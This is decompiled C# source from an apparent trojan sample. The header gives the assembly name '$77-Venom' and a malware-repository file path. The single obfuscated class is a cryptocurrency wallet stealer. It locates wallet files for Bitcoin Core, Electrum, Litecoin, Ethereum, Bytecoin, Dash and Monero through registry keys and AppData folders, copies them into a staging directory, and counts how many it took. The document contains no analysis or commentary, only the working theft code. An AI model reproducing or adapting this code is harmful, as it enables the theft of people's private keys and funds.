// Decompiled with JetBrains decompiler
// Type: 泳ⴀቒದൔ쉺⡈ൻ඲뼕倗鿻圊谇ꐁ哝ﴭ쐉唒錾
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using Microsoft.Win32;
using System;
using System.IO;

public class 泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾
{
  public static int 뺵\uEC9E縉\u2202ɰೋ熢\uF42Dⳏ\u2B4B稧䥝ﺼ귅\u25F0喌츗绤롁ӎ;

  public static void ሄ敷\uF4F9箩\u2595퉄攊ꍾ榶蚼鳻갻娳诳\uFDCE㼩獚ᗩ杷\uE9E0(string directorypath)
  {
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
      {
        try
        {
          Directory.CreateDirectory(directorypath + "\\BitcoinCore\\");
          File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
          ++泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.뺵\uEC9E縉\u2202ɰೋ熢\uF42Dⳏ\u2B4B稧䥝ﺼ귅\u25F0喌츗绤롁ӎ;
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void ᱚ섶鏧祾펎잟꧙긹䦕쨷ᥕ祥㓾呲瓳娯박\u0081\uE1A3霠(string directorypath)
  {
    try
    {
      foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets").GetFiles())
      {
        Directory.CreateDirectory(directorypath + "\\Electrum\\");
        file.CopyTo(directorypath + "\\Electrum\\" + file.Name);
        ++泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.뺵\uEC9E縉\u2202ɰೋ熢\uF42Dⳏ\u2B4B稧䥝ﺼ귅\u25F0喌츗绤롁ӎ;
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void 墹\uF7FBꙒ떽怺ﾖࣧ衠䚪㑘ᚩ늰㿡ꬲꏅ豓궹㐑\u283F聹(string directorypath)
  {
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
      {
        try
        {
          Directory.CreateDirectory(directorypath + "\\LitecoinCore\\");
          File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
          ++泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.뺵\uEC9E縉\u2202ɰೋ熢\uF42Dⳏ\u2B4B稧䥝ﺼ귅\u25F0喌츗绤롁ӎ;
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void \uFFFD붮弰蘂\u258F괉\uF159\uF795즫䧒剆ቲ㩶\uF33F겟쫶參滘좂\uECFD(string directorypath)
  {
    try
    {
      foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore").GetFiles())
      {
        Directory.CreateDirectory(directorypath + "\\Ethereum\\");
        file.CopyTo(directorypath + "\\Ethereum\\" + file.Name);
        ++泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.뺵\uEC9E縉\u2202ɰೋ熢\uF42Dⳏ\u2B4B稧䥝ﺼ귅\u25F0喌츗绤롁ӎ;
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void ළ伊祋\u2AC6岓䞫箥萙糳竑ⱌ䌬\uECBE\uF189휴庅㤐䕧ﲤ삲(string directorypath)
  {
    try
    {
      foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin").GetFiles())
      {
        Directory.CreateDirectory(directorypath + "\\Bytecoin\\");
        if (file.Extension.Equals(".wallet"))
        {
          file.CopyTo(directorypath + "\\Bytecoin\\" + file.Name);
          ++泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.뺵\uEC9E縉\u2202ɰೋ熢\uF42Dⳏ\u2B4B稧䥝ﺼ귅\u25F0喌츗绤롁ӎ;
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void \u2034殙棑샛ἂ䱝箒ⷪ\uFFFD펛뫂\u2314\uE537㦇\u2816峪\uE290뤯鍪\uE1E2(string directorypath)
  {
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
      {
        try
        {
          Directory.CreateDirectory(directorypath + "\\DashCore\\");
          File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\DashCore\\wallet.dat");
          ++泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.뺵\uEC9E縉\u2202ɰೋ熢\uF42Dⳏ\u2B4B稧䥝ﺼ귅\u25F0喌츗绤롁ӎ;
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void \u1738ꂖ泉遼㾛홬\u1AC1覱窓\uE5A5킓ऊ\uE79F泀\uF3B8\u2D68\uF89E暣㡖鑷(string directorypath)
  {
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
      {
        try
        {
          Directory.CreateDirectory(directorypath + "\\Monero\\");
          string sourceFileName = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
          Directory.CreateDirectory(directorypath + "\\Monero\\");
          File.Copy(sourceFileName, directorypath + "\\Monero\\" + sourceFileName.Split('\\')[sourceFileName.Split('\\').Length - 1]);
          ++泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.뺵\uEC9E縉\u2202ɰೋ熢\uF42Dⳏ\u2B4B稧䥝ﺼ귅\u25F0喌츗绤롁ӎ;
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void ꁵ㤫誱榺㢍흈\u287F䧻숙퐮ኧᨆ쨕땺\uFFFD牱ⱝ돟煺寲(string directorypath)
  {
  }

  public static int 톢큭\u1801欻뻕藍镬䛪ᥡ릘仯뷒\uF23DﱯꞍ弲퓼戩渎烺(string cryptoDir)
  {
    泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.ළ伊祋\u2AC6岓䞫箥萙糳竑ⱌ䌬\uECBE\uF189휴庅㤐䕧ﲤ삲(cryptoDir);
    泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.ሄ敷\uF4F9箩\u2595퉄攊ꍾ榶蚼鳻갻娳诳\uFDCE㼩獚ᗩ杷\uE9E0(cryptoDir);
    泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.\u2034殙棑샛ἂ䱝箒ⷪ\uFFFD펛뫂\u2314\uE537㦇\u2816峪\uE290뤯鍪\uE1E2(cryptoDir);
    泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.ᱚ섶鏧祾펎잟꧙긹䦕쨷ᥕ祥㓾呲瓳娯박\u0081\uE1A3霠(cryptoDir);
    泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.\uFFFD붮弰蘂\u258F괉\uF159\uF795즫䧒剆ቲ㩶\uF33F겟쫶參滘좂\uECFD(cryptoDir);
    泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.墹\uF7FBꙒ떽怺ﾖࣧ衠䚪㑘ᚩ늰㿡ꬲꏅ豓궹㐑\u283F聹(cryptoDir);
    泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.\u1738ꂖ泉遼㾛홬\u1AC1覱窓\uE5A5킓ऊ\uE79F泀\uF3B8\u2D68\uF89E暣㡖鑷(cryptoDir);
    泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.ꁵ㤫誱榺㢍흈\u287F䧻숙퐮ኧᨆ쨕땺\uFFFD牱ⱝ돟煺寲(cryptoDir);
    return 泳ⴀቒದ\u0D54쉺\u2848ൻ\u0DB2뼕倗\u9FFB圊谇ꐁ哝ﴭ쐉唒錾.뺵\uEC9E縉\u2202ɰೋ熢\uF42Dⳏ\u2B4B稧䥝ﺼ귅\u25F0喌츗绤롁ӎ;
  }
}
